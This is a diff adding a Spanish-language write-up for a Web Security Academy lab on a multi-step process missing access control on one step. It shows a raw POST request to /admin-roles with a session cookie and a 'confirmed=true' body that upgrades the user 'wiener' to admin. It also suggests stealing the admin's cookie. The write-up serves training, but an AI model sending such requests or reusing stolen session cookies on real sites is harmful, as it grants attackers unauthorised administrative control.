@@ -324,3 +324,39 @@ Connection: close
 
 ```
 
+# Multi-step process with no access control on one step
+
+Para este laboratorio solo tienes que fijarte en que el  boton de confirmar genera la misma peticion pero con unn true en los datos que envia (es POST)
+Para resolver solo tienes que robar la cookie de otro usuario en este caso del admin y listo se puede cambiar practiamete sin ninguna restriccion.
+
+ ```
+ POST /admin-roles HTTP/1.1
+Host: 0a7b002b043a8a98c0bf3ff6007100fd.web-security-academy.net
+Cookie: session=P2Cc26B5nLT6UVHEoNAsPSV5KcswFim0
+Content-Length: 45
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://0a7b002b043a8a98c0bf3ff6007100fd.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a7b002b043a8a98c0bf3ff6007100fd.web-security-academy.net/admin-roles
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+action=upgrade&confirmed=true&username=wiener
+ 
+ ```
+FIN
+
+
+
+
